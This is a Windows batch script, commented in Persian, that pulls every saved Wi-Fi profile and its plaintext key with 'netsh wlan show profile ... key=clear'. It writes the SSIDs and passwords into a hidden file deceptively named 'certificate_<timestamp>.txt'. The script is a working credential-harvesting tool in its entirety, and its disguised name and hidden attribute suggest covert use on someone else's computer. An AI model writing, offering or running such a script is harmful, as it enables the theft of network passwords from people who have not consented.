@echo off
setlocal enabledelayedexpansion

:: دریافت تاریخ و زمان به منظور ایجاد یک نام فایل منحصر به فرد
for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (
    set "month=%%a"
    set "day=%%b"
    set "year=%%c"
)
for /f "tokens=1-3 delims=:,. " %%a in ('echo %time%') do (
    set "hour=%%a"
    set "minute=%%b"
    set "second=%%c"
)

:: حذف فاصله‌ها و کاراکترهای ناخواسته (در صورت نیاز)
set "timestamp=%year%-%month%-%day%_%hour%-%minute%-%second%"

:: نام فایل خروجی شامل timestamp
set "output_file=certificate_%timestamp%.txt"

(
    echo Retrieving WiFi profiles...
    echo -----------------------------------------
    echo SSID                Password
    echo -----------------------------------------
) > %output_file%

for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "profile_name=%%A"
    set "profile_name=!profile_name:~1!"  :: حذف فاصله‌ی ابتدایی

    set "password=(No Password)"
    for /f "tokens=2 delims=:" %%B in ('netsh wlan show profile "!profile_name!" key^=clear ^| findstr "Key Content"') do (
        set "password=%%B"
        set "password=!password:~1!" :: حذف فاصله‌ی ابتدایی
    )

    echo !profile_name!            !password! >> %output_file%
)

attrib +h %output_file%

echo.
echo WiFi profiles have been saved to a hidden file named %output_file%.
timeout /t 1 >nul
exit
